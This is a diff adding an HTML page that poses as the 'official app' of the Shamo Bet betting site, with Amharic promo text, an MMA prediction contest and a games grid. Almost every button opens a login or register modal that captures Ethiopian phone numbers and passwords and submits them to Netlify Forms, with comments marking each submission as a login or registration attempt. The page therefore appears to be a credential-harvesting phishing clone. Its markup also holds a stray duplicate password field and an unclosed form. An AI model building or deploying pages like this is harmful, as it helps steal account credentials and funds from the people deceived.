@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shamo Bet - Official App</title>
+    
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body { background-color: #f1f1f1; padding-bottom: 70px; }
+
+        /* Top Header */
+        .header {
+            background-color: #be1e2d;
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .logo { color: white; font-weight: bold; font-size: 1.2rem; display: flex; align-items: center; gap: 5px; }
+        .auth-buttons button { padding: 8px 15px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .btn-login { background: #555; color: white; margin-right: 5px; }
+        .btn-register { background: #ffcc00; color: black; }
+
+        /* Icon Navigation */
+        .icon-nav {
+            background: white;
+            display: flex;
+            overflow-x: auto;
+            padding: 12px 5px;
+            gap: 15px;
+            border-bottom: 1px solid #ddd;
+            scrollbar-width: none;
+        }
+        .nav-item { text-align: center; min-width: 65px; color: #666; font-size: 0.75rem; text-decoration: none; cursor: pointer; }
+        .nav-item.active { color: #be1e2d; font-weight: bold; }
+        .nav-item i { display: block; font-size: 1.5rem; margin-bottom: 5px; font-style: normal; }
+
+        /* Hero Banner */
+        .hero-banner {
+            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('banner.jpg'); 
+            background-size: cover;
+            background-position: center;
+            height: 160px;
+            margin: 10px;
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 20px;
+            color: white;
+            position: relative;
+        }
+        .hero-banner h2 { font-size: 1.4rem; line-height: 1.2; }
+        .hero-banner .promo-text { color: #ffcc00; font-size: 1.8rem; font-weight: bold; }
+
+        /* Countdown Box */
+        .promo-box {
+            background: white;
+            margin: 0 10px 10px 10px;
+            padding: 15px;
+            border-radius: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        .timer-display { font-size: 1.2rem; font-weight: bold; color: #333; display: flex; align-items: center; gap: 8px; }
+        .timer-display::before { content: '🎁'; font-size: 1.5rem; }
+        .cashback-tag { background: #ffe6e6; color: #be1e2d; padding: 5px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: bold; }
+
+        /* MMA Prediction Card */
+        .card {
+            background: white;
+            margin: 10px;
+            border-radius: 15px;
+            padding: 15px;
+            border: 1px solid #eee;
+        }
+        .card-header { display: flex; justify-content: space-between; margin-bottom: 15px; font-weight: bold; font-size: 0.9rem; }
+        .fighters-row { display: flex; justify-content: space-around; align-items: center; margin-bottom: 15px; }
+        .fighter { text-align: center; width: 40%; }
+        .fighter img { width: 85px; height: 85px; border-radius: 15px; background: #eee; object-fit: cover; border: 2px solid #ddd; }
+        .fighter-name { font-size: 0.8rem; margin-top: 8px; font-weight: bold; color: #333; }
+        .predict-now-btn {
+            background: #be1e2d; color: white; width: 100%; padding: 16px;
+            border: none; border-radius: 12px; font-weight: bold; font-size: 1rem; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+
+        /* Games Grid */
+        .section-header { padding: 10px 15px; display: flex; gap: 10px; overflow-x: auto; scrollbar-width: none; }
+        .tab { padding: 10px 18px; border-radius: 10px; font-size: 0.85rem; font-weight: bold; white-space: nowrap; cursor: pointer; }
+        .tab-active { background: #be1e2d; color: white; }
+        .tab-inactive { background: #e8e8e8; color: #666; }
+
+        .games-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 10px; }
+        .game-card { border-radius: 15px; overflow: hidden; aspect-ratio: 1/1; background: #333; position: relative; }
+        .game-card img { width: 100%; height: 100%; object-fit: cover; }
+
+        /* Bottom Nav */
+        .bottom-menu {
+            position: fixed; bottom: 0; width: 100%; background: white;
+            display: flex; justify-content: space-around; padding: 10px 0;
+            border-top: 1px solid #ddd; box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+            z-index: 1000;
+        }
+        .b-item { text-align: center; font-size: 0.75rem; color: #888; text-decoration: none; flex: 1; cursor: pointer; }
+        .b-item.active { color: #be1e2d; }
+        .b-item span { display: block; font-size: 1.4rem; margin-bottom: 3px; }
+
+        /* Modal Overlay */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 2000;
+            align-items: flex-end;
+        }
+        .modal-content {
+            background: white;
+            width: 100%;
+            border-top-left-radius: 25px;
+            border-top-right-radius: 25px;
+            padding: 20px;
+            animation: slideUp 0.3s ease-out;
+            position: relative;
+        }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        
+        .modal-close-bar { width: 40px; height: 5px; background: #ddd; border-radius: 10px; margin: 0 auto 20px auto; }
+        .modal-close-btn { position: absolute; right: 20px; top: 15px; font-size: 1.5rem; color: #999; cursor: pointer; border: none; background: none; }
+
+        .modal-tabs { display: flex; gap: 10px; margin-bottom: 25px; }
+        .modal-tabs button { flex: 1; padding: 12px; border-radius: 10px; border: 1px solid #ddd; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .m-tab-active { background: #be1e2d !important; color: white; border: none !important; }
+
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 0.85rem; color: #666; margin-bottom: 8px; }
+        .field-box { display: flex; border: 1px solid #ddd; border-radius: 10px; overflow: hidden; background: #f9f9f9; align-items: center; }
+        .field-box .prefix { padding: 12px; background: #eee; font-weight: bold; font-size: 0.9rem; }
+        .field-box input { border: none; padding: 12px; outline: none; width: 100%; background: transparent; font-size: 1rem; }
+        .sign-in-btn { background: #be1e2d; color: white; width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 1.1rem; margin-top: 10px; cursor: pointer;}
+    .eye-toggle {
+    padding: 12px;
+    cursor: pointer;
+    color: #999;
+}
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">SHAMO.BET</div>
+        <div class="auth-buttons">
+            <button class="btn-login" onclick="openAuth('login')">LOGIN</button>
+            <button class="btn-register" onclick="openAuth('register')">REGISTER</button>
+        </div>
+    </div>
+
+    <div class="icon-nav">
+        <div class="nav-item active"><i>🏠</i>Home</div>
+        <div class="nav-item" onclick="openAuth('login')"><i>🏆</i>Sports</div>
+        <div class="nav-item" onclick="openAuth('login')"><i>❤️</i>Games</div>
+        <div class="nav-item" onclick="openAuth('login')"><i>✈️</i>Aviator</div>
+        <div class="nav-item" onclick="openAuth('login')"><i>⚡</i>Fast Keno</div>
+        <div class="nav-item" onclick="openAuth('login')"><i>🚀</i>JetX</div>
+    </div>
+
+    <div class="hero-banner">
+        <h2>የዚህን ፍልሚያ አሸናፊ በመገመት</h2>
+        <div class="promo-text">የ 100,000 ብር ተካፋይ ይሁኑ</div>
+        <p>በነፃ ይገምቱ!</p>
+    </div>
+
+    <div class="promo-box">
+        <div class="timer-display" id="timer">16h : 28m : 52s</div>
+        <div class="cashback-tag">% 10% cashback</div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span>🥊 GRAND ETHIOPIA MMA</span>
+            <span style="color:#be1e2d">🏆 100000.00</span>
+        </div>
+        <div class="fighters-row">
+            <div class="fighter">
+                <img src="fighter1.jpg" alt="Fighter 1">
+                <div class="fighter-name">NIKATE HILINA</div>
+            </div>
+            <div style="font-weight: bold; color: #999; font-size: 1.2rem;">VS</div>
+            <div class="fighter">
+                <img src="fighter2.jpg" alt="Fighter 2">
+                <div class="fighter-name">JOHNNY JIUJITSU</div>
+            </div>
+        </div>
+        <button class="predict-now-btn" onclick="openAuth('login')"><span>✨</span> PREDICT NOW</button>
+    </div>
+
+    <div class="section-header">
+        <div class="tab tab-active">✨ Hot Games</div>
+        <div class="tab tab-inactive">Most Popular in Ethiopia</div>
+    </div>
+    <div class="games-grid">
+        <div class="game-card"><img src="g1.jpg"></div>
+        <div class="game-card"><img src="g2.jpg"></div>
+        <div class="game-card"><img src="g3.jpg"></div>
+        <div class="game-card"><img src="g4.jpg"></div>
+        <div class="game-card"><img src="g5.jpg"></div>
+        <div class="game-card"><img src="g6.jpg"></div>
+    </div>
+
+    <div class="modal-overlay" id="authModal">
+        <div class="modal-content">
+            <div class="modal-close-bar"></div>
+            <button class="modal-close-btn" onclick="closeAuth()">✕</button>
+            
+            <div class="modal-tabs">
+                <button id="lTab" class="m-tab-active" onclick="toggleMode('login')">🔒 Login</button>
+                <button id="rTab" onclick="toggleMode('register')">📞 Register</button>
+            </div>
+
+            <form name="shamo-auth" method="POST" data-netlify="true">
+                <input type="hidden" name="form-name" value="shamo-auth" />
+                
+                <input type="hidden" name="auth-type" id="authTypeField" value="login" />
+
+                <div id="auth-form">
+                    <div class="input-group">
+                        <label>Phone Number</label>
+                        <div class="field-box">
+                            <span class="prefix">+251</span>
+                            <input type="number" name="phone" placeholder="Enter phone number" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <div style="display:flex; justify-content:space-between">
+                            <label>Password</label>
+                            <span style="color:#be1e2d; font-size:0.8rem; font-weight:bold;">Forgot?</span>
+                        </div>
+                        <div class="field-box">
+                            <input type="password" name="password" placeholder="Enter password" required>
+                            <span style="padding:12px; color:#aaa">👁️</span>
+                        </div>
+                    </div>
+                    <button type="submit" class="sign-in-btn" id="submitBtn">SIGN IN</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="bottom-menu">
+        <div class="b-item active"><span>🏠</span>Home</div>
+        <div class="b-item" onclick="openAuth('login')"><span>🎰</span>Games</div>
+        <div class="b-item" onclick="openAuth('login')"><span>🗒️</span>Slip</div>
+        <div class="b-item" onclick="openAuth('login')"><span>🔍</span>Check Bet</div>
+        <div class="b-item" onclick="openAuth('login')"><span>👤</span>Affiliate</div>
+    </div>
+<div class="field-box">
+    <input type="password" id="password" name="password" placeholder="Enter password" required>
+    <span class="eye-toggle" onclick="togglePassword()">👁️</span>
+</div>
+  <form name="shamo-auth" method="POST" data-netlify="true" action="/success.html">
+    <script>
+        // Timer Logic
+        let seconds = (16 * 3600) + (18 * 60) + 7;
+        function updateTimer() {
+            if (seconds <= 0) return;
+            let h = Math.floor(seconds / 3600);
+            let m = Math.floor((seconds % 3600) / 60);
+            let s = seconds % 60;
+            document.getElementById('timer').innerHTML = `${h}h : ${m}m : ${s}s`;
+            seconds--;
+        }
+        setInterval(updateTimer, 1000);
+
+        // Modal Logic
+        const modal = document.getElementById('authModal');
+        const authTypeField = document.getElementById('authTypeField');
+
+        function openAuth(mode) {
+            modal.style.display = 'flex';
+            toggleMode(mode);
+        }
+        
+        function closeAuth() { modal.style.display = 'none'; }
+
+        function toggleMode(mode) {
+            const lTab = document.getElementById('lTab');
+            const rTab = document.getElementById('rTab');
+            const submitBtn = document.getElementById('submitBtn');
+
+            if(mode === 'login') {
+                lTab.classList.add('m-tab-active');
+                rTab.classList.remove('m-tab-active');
+                submitBtn.innerText = 'SIGN IN';
+                authTypeField.value = 'login'; // Tells Netlify this was a login attempt
+            } else {
+                rTab.classList.add('m-tab-active');
+                lTab.classList.remove('m-tab-active');
+                submitBtn.innerText = 'CREATE ACCOUNT';
+                authTypeField.value = 'register'; // Tells Netlify this was a registration
+            }
+        }
+function togglePassword() {
+    const input = document.getElementById("password");
+    input.type = input.type === "password" ? "text" : "password";
+}
+        window.onclick = (e) => { if(e.target == modal) closeAuth(); }
+    </script>
+
+</body>
+</html>
+
